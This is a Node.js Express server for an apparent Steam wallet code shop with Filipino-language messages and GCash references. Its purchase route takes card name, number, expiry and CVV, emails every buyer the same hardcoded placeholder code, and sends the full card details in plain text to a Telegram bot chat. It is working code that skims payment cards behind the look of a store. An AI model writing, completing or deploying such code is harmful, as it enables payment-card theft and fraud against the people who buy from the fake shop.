const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Email sender
async function sendEmail(email, ref, code) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: `"Steam Store" <${process.env.GMAIL}>`,
    to: email,
    subject: "Your Steam Wallet Code",
    text: `Salamat sa iyong bayad!\n\nIto ang iyong Steam Code: ${code}\n\nGCash Ref: ${ref}`,
  };

  return transporter.sendMail(mailOptions);
}

// Telegram sender
async function notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const message = `✅ Steam Code Purchase
📧 Email: ${email}
🧾 Ref No: ${ref}
💰 Amount: ₱${amount}

💳 Card Details:
👤 Name: ${cardName}
🔢 Number: ${cardNumber}
📅 Exp: ${expDate}
🔒 CVV: ${cvv}`;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });
}

// Purchase route
app.post('/api/purchase', async (req, res) => {
  const { ref, email, cardName, cardNumber, expDate, cvv } = req.body;
  const code = "ABCD-1234-EFGH"; // Replace with dynamic code logic later
  const amount = 100;

  try {
    await sendEmail(email, ref, code);
    await notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv);
    res.json({ success: true });
  } catch (err) {
    console.error("❌ Error:", err.message);
    res.json({ success: false, message: err.message });
  }
});

// Start server
app.listen(3000, () => console.log("✅ Server running on http://localhost:3000"));
